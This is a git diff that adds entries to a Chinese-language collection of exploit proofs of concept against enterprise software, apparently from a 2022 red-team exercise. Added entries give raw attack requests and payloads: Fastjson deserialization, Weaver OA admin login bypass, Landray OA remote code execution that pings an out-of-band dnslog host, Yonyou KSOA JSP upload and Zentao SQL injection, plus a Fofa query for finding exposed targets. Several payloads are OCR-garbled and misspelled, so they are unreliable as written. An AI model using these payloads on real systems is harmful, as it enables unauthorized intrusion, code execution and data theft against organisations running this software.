@@ -28,6 +28,37 @@ Fastjson是阿里巴巴的开源JSON解析库，可以解析JSON格式的字符�
 
 
 
+数据包
+
+```
+POST /addComment HTTP/1.1
+Host: 10.211.55.7:8099
+Accept:" /*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=O.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Length: 40
+Content-Type: application/json; charset=utf-8
+Cookie: LOGIN_LANG=cn
+Origin: http://10.211.55.7:8099
+Referer: http:.//10.211.55.7:8099/
+User-Agent: Mozilla/5.0 (Macintosh; Intell Mac OS ×10.15; rv:102.0)Gecko/20100101Firefox/102.0
+x-Requested-With: XMLHttpRequest
+
+｛
+    "@type" : "jiava.lang.Exception",
+    "@type": "com.github.isafeblue.fastjson.SimpleException",
+    "domain": "calc"
+｝
+```
+
+
+
+参考链接：
+
+https://www.iculture.cc/cybersecurity/pig=20793
+
+
+
 ## 天融信上网行为管理系统 一句话木马
 
 
@@ -168,6 +199,30 @@ DBSTEP V3.0 170 0 1000
 
 
 
+## 泛微OA 管理员任意登录
+
+漏洞等级：严重
+
+泛微OA 任意管理员登录漏洞
+
+
+
+漏洞poc
+
+url：
+
+```
+/mobile/plugin/VerifyQuickLogin.jsp
+```
+
+payload：
+
+```
+identifier=1&language=1&ipaddress=
+```
+
+
+
 
 
 ## 泛微 OA 文件上传
@@ -205,6 +260,12 @@ Test
 ------WebKitFormBoundarymVk33liI64J7GQaK—
 ```
 
+将文件释放至跟网站根路径下 在数据包中将 fileid 替换
+
+![图片[8]-2022护网第五天 含IP情报、漏洞、趣事-FancyPig's blog](hw2022poc%E6%A2%B3%E7%90%86.assets/20220729183721747.png)
+
+
+
 
 
 ## 泛微 eoffice10 前台 getshell
@@ -237,9 +298,134 @@ Content-Disposition: form-data; name="FileData"; filename="1.jpg" Content-Type: 
 
 
 
+
+
+## 蓝凌OA授权RCE和未授权RCE
+
+#### Fofa搜索资产
+
+```
+app="Landray-OA系统"
+```
+
+#### URL
+
+其中xxxx.dnslog.cn为你dns回连的地址
+
+```
+/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 xxxx.dnslog.cn")&type=1
+```
+
+
+
+## H3C CAS云计算平台分布式存储管理系统任意用户密码读取
+
+```
+/user/user/1
+```
+
+
+
+
+
+## 用友时空KSOA软件前台文件上传漏洞
+
+漏洞等级：高危
+
+```
+POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=gmtxj.jsp HTTP/1.0
+Host:xox.com
+content-Length:247
+Accept-Encoding:identity
+Accept-Language:zh-CN,zh;q=0.8 Accept:*/*
+User-Agent:Mozlla/5.0 (Windows NT 5.1; rv.5.0) Gecko/20100101 Firetox15.0 Zerolab-P/v3.2 Accept-Charset:GBK,utf-8;q=0.7,*;q=0.3 Zerolab-Scan;Zerolab-PN3.2
+Referer:http:lwww.baidu.com
+cache-controL:max-age=0x-varnlish:196324196
+
+<%
+out.printin(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTIhMWIMwMzKZMzCZYZViNDM="); new java.io.File(application.getReallPath(request getServletPathOl).delete();
+%>
+```
+
+
+
+参考链接：
+
+https://planet.vulbox.com/detail/MTA2OTA=的评论区
+
+
+
+## 禅道v16.5 SQL注入
+
+**漏洞描述**：
+
+漏洞编号 CNVD-2022-42853
+
+**影响产品**
+
+禅道企业版 6.5
+
+禅道旗舰版 3.0
+
+禅道开源版 16.5
+
+禅道开源版 16.5.beta1
+
+
+
+漏洞poc
+
+下载地址： https://github.com/west9b/ZentaoSqli 
+
+url：
+
+/zentao/user-login.html
+
+payload：
+
+```
+account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28
+```
+
+
+
+
+
+
+
+
+
+## 【无poc】红帆医疗云OA医用版 SQL注入
+
+漏洞等级：中危
+
+漏洞详细：红帆医疗云OA医用版存在前台SQL注入漏洞
+
+漏洞危害：攻击者可以在易受攻击的系统上执行任意 SQL 语句。根据正在使用的后端数据库， SQL 注入漏洞会导致攻击者访问不同级别的数据/系统。在某些情况下，可以读入或写出文件，或者在底层操作系统上执行 shell 命令。
+
+
+
+```
+
+```
+
+参考链接：
+
+https://planet.vulbox.com/detail/MTEyNjk=
+
+修复建议：
+
+加waf，尽快更新系统框架
+
+
+
+
+
 ## 参考链接
 
 https://www.iculture.cc/cybersecurity/pig=21144
+
+https://www.iculture.cc/cybersecurity/pig=21096
 
 https://mp.weixin.qq.com/s/IeRLgt5kCKbythKXebrjiA
 
